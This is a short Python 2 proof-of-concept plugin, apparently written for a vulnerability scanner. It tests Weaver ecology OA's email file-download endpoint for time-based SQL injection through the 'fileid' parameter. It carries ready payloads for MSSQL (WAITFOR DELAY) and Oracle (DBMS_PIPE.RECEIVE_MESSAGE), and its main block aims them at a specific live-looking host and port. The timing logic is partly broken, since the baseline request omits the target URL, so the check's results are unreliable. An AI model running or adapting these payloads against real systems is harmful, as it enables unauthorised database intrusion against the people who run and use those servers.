#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 泛微 ecology fileid参数 SQL注入
Author    : a
mail      : a@lcx.cc
Referer   : http://www.wooyun.org/bugs/wooyun-2014-076418
数据库分为 mssql 和oracle
"""

import urlparse
import time

def assign(service, arg):
    if service == 'weaver_oa':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    true_url='weaver/weaver.email.FileDownloadLocation?fileid=32&download=1'
    start_time=time.time()
    code, head, res, errcode, _ = curl.curl2(true_url)
    end_time=time.time()
    true_time=end_time-start_time

    payloads = [
        'weaver/weaver.email.FileDownloadLocation?fileid=32%20WAITFOR%20DELAY%20\'0:0:5\'&download=1', #mssql
        'weaver/weaver.email.FileDownloadLocation?fileid=32%20AND%209285=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(83)||CHR(81)||CHR(70),5)&download=1' #oracle
        ]
    for payload in payloads:
        flase_url = arg + payload
        start_time1 = time.time()
        code1, head1, res1, errcode1, _ = curl.curl2(flase_url)
        end_time1=time.time()
        flase_time=end_time1-start_time1

        if code == 200 and  flase_time>true_time and flase_time >5:
            security_hole(true_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oaf.yitoa.com:6688/')[1])